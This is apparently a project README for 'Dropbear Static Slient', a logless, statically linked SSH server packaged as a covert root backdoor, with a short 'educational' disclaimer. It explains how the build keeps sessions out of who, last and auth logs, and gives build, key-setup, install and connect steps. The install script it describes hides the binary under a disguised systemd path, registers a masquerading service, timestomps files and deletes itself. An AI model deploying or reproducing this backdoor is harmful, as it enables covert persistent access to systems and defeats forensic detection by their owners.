# Dropbear Static Slient (For Educational Research)

A minimized,logless，statically-linked Dropbear SSH build which can act as an stealthy ssh backdoor.
> **⚠️ DISCLAIMER: This tool is strictly for educational purposes and authorized security testing only.**
> 
> The author is not responsible for any misuse of this code. Using this tool on systems without explicit permission is illegal and unethical. This project demonstrates how persistence mechanisms work in Linux environments to help Blue Teams improve detection capabilities.



### 👻 Forensic Evasion (Logless Operation)

This build is explicitly compiled with all logging and accounting features disabled (`--disable-syslog`, `--disable-wtmp`, `--disable-utmp`, etc.). 

**Impact on System Monitoring:**
* **No Active User List:** The attacker's session will **NOT** appear in the output of standard commands like `who`, `w`, or `users`.
* **No Login History:** The connection is **NOT** recorded in `/var/log/wtmp` or `/var/log/btmp`, meaning the session will be invisible to the `last` and `lastb` commands.
* **No Syslog Traces:** Authentication events (successful or failed) are **NOT** written to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS).
* **Result:** A completely silent shell session that leaves no traditional cryptographic or accounting footprint on the host system.

## usage

### 1. Build (Optional)

If you prefer to compile from source (recommended for verifying integrity):

```bash
# Requires Docker
./build.sh

```

This will output a static `dropbear` binary in your current directory.

### 2. Configuration

Open `install.sh` and edit the following variable to include your own **SSH Public Key** (supports `ssh-rsa` and `ssh-ed25519`):

```bash
# Inside install.sh
YOUR_PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC..."

```

### 3. Installation

Transfer the binary and the script to the target research environment (requires Root privileges):

```bash
chmod +x install.sh
./install.sh

```

**What the script does:**

1. Moves the binary to a disguised system path (`/usr/lib/systemd/...`).
2. Creates a hidden directory for `authorized_keys`.
3. Registers a systemd service (masquerading as a journal helper) to ensure persistence.
4. Applies timestomping to match system files.
5. Self-destructs the installation script.

### 4. Connection

Once installed, the service listens on port **2222** (default).

```bash
ssh -p 2222 root@TargetIP -i id_ed25519

```

